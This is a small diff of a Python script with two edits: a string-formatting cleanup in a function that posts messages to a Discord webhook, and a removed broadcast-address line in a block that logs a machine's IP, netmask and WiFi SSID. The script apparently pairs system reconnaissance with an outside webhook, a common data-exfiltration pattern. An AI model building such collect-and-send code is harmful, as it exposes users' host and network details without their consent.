@@ -12,7 +12,7 @@ def send_to_discord(message):
     payload = json.dumps({'content': message})
     response = requests.post(webhook_url, headers=headers, data=payload)
     if response.status_code == 204:
-        print(f"Message sent successfully to Discord webhook.")
+        print("Message sent successfully to Discord webhook.")
     else:
         print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
 
@@ -73,7 +73,6 @@ with open('log.txt', 'w') as f:
         for addr in addresses:
             f.write(f"IP Address: {addr['addr']}\n")
             f.write(f"Netmask: {addr['netmask']}\n")
-            f.write(f"Broadcast Address: {addr['broadcast']}\n")
         f.write("\n")
     f.write(f"=== WiFi Details ===\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
